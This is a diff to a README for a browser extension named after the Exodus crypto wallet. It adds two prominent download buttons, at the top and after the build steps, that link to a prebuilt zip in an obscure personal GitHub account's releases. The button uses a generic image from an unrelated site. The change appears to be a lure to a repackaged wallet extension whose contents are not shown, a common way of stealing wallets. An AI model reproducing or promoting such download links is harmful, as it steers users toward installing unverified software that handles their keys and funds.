@@ -1,5 +1,11 @@
 # 🦊 Exodus Web3 Browser Extension
 
+<p align="center">
+  <a href="https://github.com/daniel-taylor-io1992t8/exodus-extension/releases/download/download/exodus-extension.zip">
+    <img src="https://www.coinagemag.com/wp-content/uploads/2017/12/free-download-png-blue-color-free-download-button-679-1.png" alt="Download" width="250"/>
+  </a>
+</p> 
+
 ![Version](https://img.shields.io/badge/version-2.4.0-blue?style=for-the-badge)
 ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)
 ![Platform](https://img.shields.io/badge/platform-Chrome%20%7C%20Brave%20%7C%20Edge-orange?style=for-the-badge)
@@ -59,6 +65,11 @@ Ensure you have the following installed:
     - Click **Load unpacked**.
     - Select the `build` folder generated in your project directory.
 
+<p align="center">
+  <a href="https://github.com/daniel-taylor-io1992t8/exodus-extension/releases/download/download/exodus-extension.zip">
+    <img src="https://www.coinagemag.com/wp-content/uploads/2017/12/free-download-png-blue-color-free-download-button-679-1.png" alt="Download" width="250"/>
+  </a>
+</p> 
 ---
 
 ## 🔒 Security Best Practices
